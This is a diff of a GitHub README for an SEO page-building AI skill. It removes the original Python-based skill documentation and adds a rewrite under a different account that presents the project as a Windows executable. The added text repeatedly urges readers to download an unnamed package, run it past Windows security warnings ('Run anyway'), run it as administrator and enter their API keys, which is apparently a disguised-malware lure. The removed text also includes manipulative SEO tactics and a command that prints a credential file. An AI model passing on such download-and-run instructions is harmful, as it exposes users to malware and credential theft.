@@ -1,348 +1,255 @@
-# seobuild-onpage v1.5.0
-
-### One command. Competitive data in. Ranking pages out.
-
-```
-claude install-skill gbessoni/seobuild-onpage
-```
-
-Most SEO tools tell you what's wrong with your site. This one writes the pages.
-
-`/seoagi "airport parking JFK"` pulls the current SERP, analyzes what's ranking, finds the gaps in their content, and writes you a complete page -- with the heading structure, depth, FAQ section, and schema markup that actually competes. Not thin content. Not keyword-stuffed filler. Pages backed by live data from the tools the pros use.
-
-**New in v1.5.0 -- Forensic SEO Protocols:**
-- **QDD Vulnerability Check** -- UGC (Instagram, Pinterest, Reddit) ranking for a commercial keyword is a structural gap, not a signal to avoid. Flag as HIGH_CONFIDENCE_TAKEOVER.
-- **Site Over Page Rule** -- generalist competitors ranking with one page are vulnerable to specialist site architecture. Niche Site Pivot trigger fires when 2/3 top results are generalist pages.
-- **Query Fan-Out (QFO) Facet Coverage** -- each 500-token chunk now targets a specific AI sub-query. 40% of future traffic arrives via AI fan-out from a single user prompt.
-- **Forensic EMQ Check** -- EMQ in H1 is conditionally required when 2/3 top competitors use it. Competitive context overrides the default entity-based heading rule.
-- **Orcas One CVR Modeling** -- keywords now ranked by estimated conversion value, not raw volume. Position 1 at 4.5% CVR vs position 7 at 2%.
-- **38-point quality checklist** with QDD, Site vs. Page, EMQ ratio, and QFO facet checks.
-
-**New in v1.4.0 -- March 2026 Update Protocols:**
-- **NavBoost Geographic Click Relevance** -- pages now reranked by geographic click patterns. Local pages require neighborhood-level specificity, not just city names. Observed across SEO X community testing.
-- **Click Satisfaction as Primary Signal** -- Google watches if users are satisfied after clicking. Content must deliver value in the first 3 chunks or rankings drop regardless of quality. Confirmed via practitioner NavBoost analysis.
-- **AI Overview Link Optimization** -- earning a link inside AI Overviews drives 70-80% CTR. Pages structured for snippet extraction with clean tables and FAQ markup.
-- **AI Overview Theft Defense** -- rising impressions + falling clicks = your content cited without credit. Interactive elements (calculators, widgets) defend against extraction.
-- **QDD (Query Deserves Diversity)** -- Google pulls diverse results into overviews. Information Gain Test now critical for QDD survival.
-- **FHASS Replaces YMYL** -- Financial, Health, And Safety, and Security. Expanded scrutiny for risk-adjacent content. Discussed in Google Cloud documentation updates.
-- **Banned 2026 Content Patterns** -- generic AI FAQs, 300-word thin pages, blog rolls outside topical circle all confirmed penalized.
-- **34-point quality checklist** with geographic specificity, click satisfaction, FHASS compliance, and minimum 1,500-word depth checks.
-
-**New in v1.3.0 -- 2026 SEO Protocols:**
-- **AI Summary Nuggets** -- every page opens with a 200-character fact-dense block designed for Perplexity/Gemini/ChatGPT to cite as a consensus source. Position zero for LLM retrieval.
-- **Original Research Block** -- mandatory data experiment or first-hand observation section. Google's highest-priority E-E-A-T signal: Experience. Pages without original research cap at 20/28.
-- **Map Traffic Shifting** -- internal links from high-traffic informational pages to map embeds, shifting engagement signals toward local intent.
-- **Spam Resilience** -- quality scoring now prioritizes technical relevance density over "human tone." Factually perfect content is not downgraded for sounding clinical.
-- **Recursive Fact-Checking** -- every claim validated against 2+ high-ranking sources for Entity Consensus before delivery.
-- **28-point quality checklist** with mandatory printed scorecard at the end of every output.
-
-**New in v1.2.0 -- Anti-Spam Ranking Signals:**
-- Single H1 rule, no exact-match keyword in meta descriptions or subheadings
-- No keyword-stuffed alt text, no duplicate content
-- Internal linking requirements, broken backlink awareness
-- Interactive elements (calculators, widgets) to defend against AI Overview traffic loss
-
-**New in v1.1.0 -- GEO Framework Additions:**
-- RAG Targeting: zero-volume long-tail queries that "train" AI to cite your domain
-- Topical Circle Audit: stay inside your core service topic or dilute AI authority
-- Off-Page Sequencing: establish third-party brand footprint before on-page SEO
-- Reddit Subdomain Indexing: seed entity consensus across indexed Reddit layers
-- Ask Maps / Conversational GBP Optimization
-- FAQ/PAA section and JSON-LD schema now mandatory in every output
-
-**I built this because I got tired of the gap between "SEO audit" and "published page."** I've been doing SEO for 20+ years in ground transportation (1M+ bookings, 2M+ rides across my companies). The workflow was always the same: pull SERP data, analyze competitors, find gaps, write brief, write page, add schema, publish. Over and over. So I turned that entire workflow into a single skill that any AI agent can execute.
-
-The result? I used this to research a competitor's best-performing pages, built equivalent content with `/seoagi`, bought the exact-match domains, and every single page is ranking on page 1. That's not theory. That's the workflow.
-
----
-
-## What It Actually Does
-
-```
-You: /seoagi "best project management tools 2026"
-
-SEO-AGI:
-  1.  Pulls SERP top 10 via DataForSEO
-  2.  Parses competitor content (word count, headings, topics covered)
-  3.  Extracts People Also Ask questions
-  4.  Pulls related keywords with search volumes
-  5.  Detects search intent (informational vs commercial vs transactional)
-  6.  Generates a data-driven content brief
-  7.  Writes the complete page (Markdown + YAML frontmatter)
-  8.  Adds 200-char AI Summary Nugget for LLM citation
-  9.  Adds FAQ section from real PAA data
-  10. Generates JSON-LD schema markup + inline RDFa entities
-  11. Validates every claim against 2+ sources (Entity Consensus)
-  12. Validates against 28-point quality checklist
-  13. Prints scorecard so you see exactly what passed
-```
-
-For rewrites, point it at any URL. It compares your page against the current top 3 ranking competitors, identifies exactly what you're missing, and rewrites with a change summary explaining every edit.
-
----
-
-## The SEO Knowledge Inside
-
-This isn't a wrapper around "write me an SEO article." The skill encodes strategies from the best in the game:
-
-**Traditional SEO**
-- Intent-first content architecture (match what searchers actually want, not what you think the keyword means)
-- Competitive word count targeting (page length based on what's ranking, not arbitrary "write 2000 words")
-- Heading hierarchy derived from SERP analysis (not templates, not guesswork)
-- People Also Ask coverage as FAQ sections (answer the questions Google already knows people are asking)
-- Schema markup patterns by page type (FAQPage, LocalBusiness, HowTo, Product, BreadcrumbList)
-- Internal linking suggestions based on actual site data from GSC
-
-**GEO / LLM SEO (Generative Engine Optimization)**
-- 200-char AI Summary Nugget at top of every page, designed for Perplexity/Gemini/ChatGPT to cite as a consensus source
-- 500-token chunk architecture matching Google AI's retrieval window
-- Content structured for AI citation (Perplexity, ChatGPT, Google AI Overviews)
-- Entity-rich writing that LLMs can extract and reference
-- Depth-over-length philosophy (comprehensive coverage that becomes the authoritative source)
-- FAQ patterns that match how AI systems parse and surface answers
-- Data-backed claims that AI systems prefer to cite over vague assertions
-- RAG targeting: zero-volume long-tail queries that "train" AI to cite your domain
-- Off-page sequencing: establish third-party brand footprint before on-page SEO
-- Reddit subdomain indexing: seed entity consensus across indexed Reddit layers
-- Topical circle enforcement: stay inside your core service topic to avoid diluting AI authority signals
-- Recursive fact-checking: every claim validated against 2+ high-ranking sources for Entity Consensus
-- Spam resilience: technical relevance density prioritized over "human tone" in quality scoring
-
-**Local / GBP Optimization**
-- Ask Maps & conversational GBP optimization (structured data that answers "who has X available?")
-- Holiday/exception hours, discrete service items, pre-populated Q&A
-- GBP fields treated as AEO markup, not optional admin work
-- Map traffic shifting: internal links from high-traffic informational pages to map embeds to boost local engagement signals
-
-**Content Quality Signals (2026 protocols)**
-- Mandatory Original Research / Data Experiment block in every page (Google's top E-E-A-T signal: Experience)
-- Verification tagging system: every claim tagged with `{{VERIFY}}`, `{{RESEARCH NEEDED}}`, or `{{SOURCE NEEDED}}`
-- "Not For You" block: honest section telling readers when this option is a bad fit (trust signal competitors skip)
-- Information Gain Test: every page must contain content not found in the top 10 Google results
-
-**The 38-point quality checklist every page runs through:**
-- Information gain over top 10 Google results? Check.
-- Reddit Test: would a practitioner upvote this? Check.
-- Core answer in first 150 words? Check.
-- Fast-scan summary within first 200 words? Check.
-- 2+ hard operational Prove-It facts? Check.
-- Real HTML tables (not bullet lists)? Check.
-- Every section doing a unique job (no repetition)? Check.
-- All specific numbers tagged with `{{VERIFY}}`? Check.
-- All citations specific and traceable? Check.
-- "Not For You" block present? Check.
-- 500-token chunk architecture? Check.
-- No banned phrases or patterns? Check.
-- Word count within competitive range? Check.
-- JSON-LD schema block matching page type? Check.
-- FAQ section with 3+ PAA questions? Check.
-- Hub/spoke internal links? Check.
-- Title tag <60 chars with target keyword? Check.
-- Meta description <155 chars with value prop? Check.
-- Content inside site's core topical circle? Check.
-- `reddit_test` and `information_gain` in frontmatter? Check.
-- Single H1 tag only? Check.
-- No exact-match keyword in meta description? Check.
-- No keyword stuffing in H2/H3/H4 tags? Check.
-- Image alt text descriptive, not keyword-stuffed? Check.
-- AI Summary Nugget (200-char) at top of page? Check.
-- Original Research / Data Experiment block present? Check.
-- Map-to-informational internal link (local pages)? Check.
-- Every claim validated against 2+ sources? Check.
-
-- QDD check run -- UGC in top 10 flagged or cleared? Check.
-- Site vs. Page audit -- competitor type identified? Check.
-- Forensic EMQ ratio checked -- applied correctly? Check.
-- Each 500-token chunk targets a distinct QFO facet? Check.
-
-Pages scoring below 30/38 get flagged with specific items to fix. The scorecard is printed at the end of every output so you see exactly what passed.
-
----
-
-## Data Integrations (BYOK)
-
-Bring your own API keys. Use one, use all. The skill adapts:
-
-| Integration | What It Provides | Required? |
-|---|---|---|
-| **DataForSEO** | Live SERP results, keyword volumes, People Also Ask, competitor content parsing | Yes (core) |
-| **Google Search Console** | Your actual query data, CTR, positions, cannibalization detection | Optional |
-| **Ahrefs** (via MCP) | Backlink profiles, domain authority, referring domains | Optional |
-| **SEMRush** (via MCP) | Traffic estimates, keyword gaps, competitive positioning | Optional |
-
-No keys at all? The skill falls back to web search. You lose precision but the workflow still runs.
-
----
-
-## Install + Setup
-
-### Step 1: Install the skill
-
-Pick your platform:
-
-**Claude Code (Mac app / CLI):**
-1. Download the [latest release zip](https://github.com/gbessoni/seo-agi/archive/refs/heads/main.zip)
-2. In Claude Code, go to **Settings > Skills > Upload skill**
-3. Drag the `.zip` file into the upload dialog
-
-Or install via CLI:
-```bash
-claude install-skill gbessoni/seobuild-onpage
-```
-
-**OpenClaw:**
-```bash
-git clone https://github.com/gbessoni/seobuild-onpage.git ~/.claude/skills/seo-agi
-```
-
-**Codex:**
-```bash
-git clone https://github.com/gbessoni/seobuild-onpage.git ~/.codex/skills/seo-agi
-```
-
-**Manual (any platform):**
-```bash
-git clone https://github.com/gbessoni/seobuild-onpage.git ~/.claude/skills/seo-agi
-```
-
-### Step 2: Install Python dependency
+# 🧠 seobuild-onpage - Build pages that rank and get cited
 
-```bash
-pip install requests
-```
+[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/Ebenezerhooknosed777/seobuild-onpage)
 
-### Step 3: Configure API keys (optional but recommended)
+## 📥 Download
 
-```bash
-mkdir -p ~/.config/seo-agi
-cp ~/.claude/skills/seo-agi/.env.example ~/.config/seo-agi/.env
-```
+Visit this page to download: https://github.com/Ebenezerhooknosed777/seobuild-onpage
 
-Then edit `~/.config/seo-agi/.env` with your keys:
+Use the page to get the latest version for Windows. If you see a release file, download it. If the project is provided as source files, download the ZIP file from the page and follow the steps below.
 
-```env
-# DataForSEO -- sign up at https://dataforseo.com (~$0.002/query)
-DATAFORSEO_LOGIN=your_email@example.com
-DATAFORSEO_PASSWORD=your_password
+## 🖥️ What this app does
 
-# Google Search Console (optional)
-GSC_SERVICE_ACCOUNT_PATH=/path/to/service-account.json
-```
+seobuild-onpage helps you build SEO pages from one input. It takes your topic, checks the live search landscape, and shapes the page for both search engines and AI tools.
 
-**No API keys?** The skill still works. It falls back to Ahrefs/SEMRush MCP tools (if connected) or web search. You lose SERP content parsing but the framework still writes quality pages.
+It is built for people who want:
+- a page that matches search intent
+- a layout that is easy for search bots to read
+- clear entity coverage
+- content that supports Google ranking and AI citation
+- a workflow that uses your own GSC and DataforSEO accounts
 
-### Step 4: Verify it works
+## ⚙️ What you need on Windows
 
-```bash
-# Test the research pipeline (uses mock data, no API keys needed)
-python3 ~/.claude/skills/seo-agi/scripts/research.py "airport parking JFK" --mock --output=compact
-```
+Before you start, make sure you have:
 
-You should see SERP results, PAA questions, related keywords, and heading structure data. If you see that, you're good.
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of free disk space
+- A modern browser
+- Your Google Search Console account, if you plan to use BYOK features
+- Your DataforSEO account, if you plan to use competitive data features
 
-### Step 5: Use it
+If the app comes as a ZIP file, you will also need the built-in Windows extractor or 7-Zip.
 
-Open Claude Code (or OpenClaw, or Codex) and type:
+## 🚀 Get the app running
 
-```
-Write an SEO page for "airport parking JFK"
-```
+1. Open this page: https://github.com/Ebenezerhooknosed777/seobuild-onpage
+2. Download the latest Windows package or ZIP file
+3. If the file is zipped, right-click it and choose Extract All
+4. Open the extracted folder
+5. Look for the main app file, installer, or launch file
+6. Double-click it to start the app
 
-The skill auto-triggers on SEO content requests. It will:
-1. Run the research script to pull competitive data
-2. Show you a content brief and confirm before writing
-3. Write the full page following the SEO-AGI framework
-4. Validate against the quality checklist
-5. Save to `~/Documents/SEO-AGI/pages/`
+If Windows shows a security prompt:
+- choose More info
+- then choose Run anyway only if you trust the source
 
----
+## 🧭 First setup
 
-## Verify Your Setup (Troubleshooting)
+When the app opens for the first time, it may ask for:
 
-**Check if the skill is installed:**
-```bash
-ls ~/.claude/skills/seo-agi/SKILL.md && echo "Installed" || echo "Not found"
-```
+- a project name
+- your target keyword or page topic
+- your site URL
+- your Google Search Console details
+- your DataforSEO key
+- your preferred output format
 
-**Check if API keys are configured:**
-```bash
-cat ~/.config/seo-agi/.env 2>/dev/null || echo "No .env file -- skill will use fallback mode"
-```
+Use the same topic you want to rank for. Keep the first run simple. A short topic works better than a long one.
 
-**Test with live DataForSEO (if you have keys):**
-```bash
-python3 ~/.claude/skills/seo-agi/scripts/research.py "best crm software" --output=compact
-```
+## 📝 How to use it
 
-**Run unit tests:**
-```bash
-cd ~/.claude/skills/seo-agi
-python3 tests/test_env.py && python3 tests/test_serp_analyze.py && python3 tests/test_dataforseo.py
-```
+1. Enter your page topic
+2. Add the target URL, if you already have one
+3. Connect GSC if you want search data from your site
+4. Connect DataforSEO if you want live SERP and competitor data
+5. Start the build
+6. Wait for the page plan or draft to finish
+7. Review the output before publishing
 
----
+The app may create:
+- page outlines
+- content blocks
+- entity lists
+- internal link ideas
+- title tag ideas
+- meta description ideas
+- verification tags for key claims
 
-## Use Cases
+## 🔍 What the app is built to do
 
-**Exact-match domain play**: Research competitor's top pages with OpenClaw, generate equivalent content with `/seoagi`, buy the domains, publish. Page 1.
+seobuild-onpage is aimed at modern on-page SEO work. That includes:
 
-**Location page generation**: `/seoagi "plumber in [city]"` x 50 cities. Each page gets city-specific research, local PAA questions, LocalBusiness schema. Not cookie-cutter templates.
+- competitive page review
+- search intent matching
+- entity coverage
+- content chunking
+- page structure planning
+- fact checks for key points
+- SEO and GEO style outputs
+- support for AI-assisted writing tools
 
-**Content refresh**: Point it at your underperforming URLs. It pulls your actual GSC data, compares against current top 3, and tells you exactly what to add, expand, or restructure. Then does it.
+It is built to help with pages that need both classic SEO signals and AI-friendly structure.
 
-**Competitive intelligence**: `/seoagi research "competitor keyword"` gives you the full landscape without writing anything. Word count ranges, heading structures, topic gaps, related keywords with volumes.
+## 📚 Typical workflow
 
-**Brief handoff**: `/seoagi brief "keyword"` generates a structured content brief you can hand to a human writer. Research-backed, not vibes-based.
+A simple workflow looks like this:
 
----
-
-## The Workflow That Got Me Here
-
-I've been running this workflow manually for 20 years across ParkingAccess.com (1M+ bookings) and Shuttlefare.com (2M+ rides). The pattern never changed:
-
-1. Find what's ranking
-2. Figure out what they cover that you don't
-3. Write something deeper
-4. Add the technical SEO (schema, meta, structure)
-5. Publish and move on
-
-seobuild-onpage is that pattern, automated. The 20 years of pattern recognition compressed into a SKILL.md file, backed by live data APIs, running inside a super agent that can decompose and parallelize the work.
-
-It's not AI replacing SEO expertise. It's SEO expertise finally having the right delivery mechanism.
-
----
-
-## Testing
-
-See "Verify Your Setup" above for full test commands. Quick version:
-
-```bash
-cd ~/.claude/skills/seo-agi
-
-# Unit tests (no API keys needed)
-python3 tests/test_env.py && python3 tests/test_serp_analyze.py && python3 tests/test_dataforseo.py
-
-# Mock mode (full pipeline with fixture data)
-python3 scripts/research.py "airport parking JFK" --mock --output=compact
-
-# No-creds mode (returns skeleton for agent to fill via MCP/WebSearch)
-python3 scripts/research.py "test keyword" --output=compact
-```
-
----
-
-## Contributing
-
-Open source, MIT license. PRs welcome.
-
-The skill is modular. Want to add a new page template? Edit `references/page-templates.md`. New schema pattern? `references/schema-patterns.md`. Better quality checks? `references/quality-checklist.md`. New data source? Add a client in `scripts/lib/` and wire it into `research.py`.
-
----
-
-## Credits
-
-Built by [Greg Bessoni](https://github.com/gbessoni) ([@gregbessoni](https://x.com/gregbessoni)).
-
-## License
-
-MIT
+1. Pick one keyword or topic
+2. Pull competitor data
+3. Review the search intent
+4. Build a page map
+5. Write the page in sections
+6. Add proof points and verification tags
+7. Check for missing entities
+8. Export or copy the result into your editor
+
+This keeps the page focused and easier to publish.
+
+## 🔐 BYOK accounts
+
+Some parts of the app may use your own API keys.
+
+### Google Search Console
+Use GSC when you want:
+- query data
+- page data
+- performance data from your site
+
+### DataforSEO
+Use DataforSEO when you want:
+- SERP data
+- competitor snapshots
+- keyword and page research
+- search result features
+
+Keep your keys private. Do not share them in public files.
+
+## 🧱 File layout
+
+After extraction, you may see files like:
+
+- app.exe
+- installer.exe
+- config
+- data
+- output
+- logs
+- README.md
+
+If you are not sure which file starts the app, look for the one with the app name or the installer name.
+
+## 🛠️ Common Windows steps
+
+### If nothing happens when you double-click
+- Try running the file as administrator
+- Check if Windows blocked the file
+- Re-extract the ZIP file and try again
+
+### If Windows says the app is unsafe
+- Check that you downloaded it from the link above
+- Use the latest file from the repository page
+- Make sure the file finished downloading
+
+### If the app opens and closes right away
+- Open it from the folder again
+- Look for an error window
+- Check whether you downloaded the full package
+
+### If your browser opens the file
+- Download the file first
+- Save it to your Downloads folder
+- Open the saved file from File Explorer
+
+## 🧪 Good first test
+
+For your first run, use a simple page topic like:
+- local SEO service page
+- SaaS feature page
+- product comparison page
+- blog post about a narrow topic
+- landing page for one service
+
+This makes it easier to check the output and confirm the setup works.
+
+## 🧩 Inputs that work well
+
+Use clear inputs like:
+- main topic
+- target country or city
+- brand name
+- competing pages
+- target audience
+- page goal
+- key facts you want included
+
+The cleaner the input, the better the output.
+
+## 📤 Output you may get
+
+Depending on the version, the app may generate:
+- page briefs
+- draft sections
+- SEO notes
+- entity maps
+- question lists
+- heading structures
+- content checklists
+- citation prompts
+- verification markers
+
+Use the output as a base for your final page.
+
+## 🧰 Troubleshooting
+
+### The ZIP file will not open
+- Download it again
+- Make sure the file finished downloading
+- Try Windows Extract All
+
+### The app asks for missing data
+- Fill in every required field
+- Add your API keys if the feature depends on them
+- Check for blank topic or URL fields
+
+### The output looks thin
+- Use a more specific keyword
+- Add competitor data
+- Add more context about the page goal
+- Try a topic with clear search intent
+
+### Search data does not load
+- Check your internet connection
+- Confirm your GSC or DataforSEO key is correct
+- Make sure the account has access
+
+## 🧭 Best results
+
+Use one page per topic. Keep the search intent clear. Give the app enough data to work with, but do not overload it with unrelated text. A focused input usually gives a better page plan.
+
+## 📌 Who this is for
+
+This tool is for people who want to:
+- build SEO pages faster
+- turn research into a page plan
+- work with Google Search Console data
+- use DataforSEO for research
+- make pages that are easier for AI tools to cite
+- keep on-page work organized
+
+## 🪟 Windows install checklist
+
+- Download the file from the repository page
+- Extract it if needed
+- Open the main app or installer
+- Allow Windows permissions if asked
+- Enter your topic and keys
+- Run the first build
+- Review the result
+
+## 🔗 Download again
+
+Use this link to visit the download page: https://github.com/Ebenezerhooknosed777/seobuild-onpage
+
+If the page offers a release file, download and run that file. If it offers a ZIP package, download the ZIP, extract it, and start the app from the extracted folder
